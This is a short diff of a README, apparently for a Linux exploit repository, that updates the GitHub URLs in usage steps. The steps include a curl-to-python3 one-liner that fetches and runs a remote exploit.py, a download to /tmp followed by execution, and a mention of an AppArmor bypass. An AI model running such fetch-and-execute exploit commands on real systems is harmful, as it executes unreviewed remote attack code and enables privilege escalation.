@@ -35,7 +35,7 @@ This repo provides two variants. Both produce the same result; pick based on you
 
 ```bash
 # One-liner via pipe
-python3 -c "$(curl -sL https://raw.githubusercontent.com/guiimoraes/copyfail2-dirtyfrag-py/main/exploit.py)"
+python3 -c "$(curl -sL https://raw.githubusercontent.com/guiimoraes/copyfail2-py/main/exploit.py)"
 
 # Saved file
 python3 exploit.py
@@ -54,7 +54,7 @@ python3 exploit_raw.py --clean
 On Ubuntu with `apparmor_restrict_unprivileged_userns` enabled, save the file first and run from disk; the pipe mode skips the AppArmor bypass dance.
 
 ```bash
-curl -sL ttps://raw.githubusercontent.com/guiimoraes/copyfail2-dirtyfrag-py/main/exploit.py > /tmp/x.py
+curl -sL ttps://raw.githubusercontent.com/guiimoraes/copyfail2-py/main/exploit.py > /tmp/x.py
 python3 /tmp/x.py
 ```
 
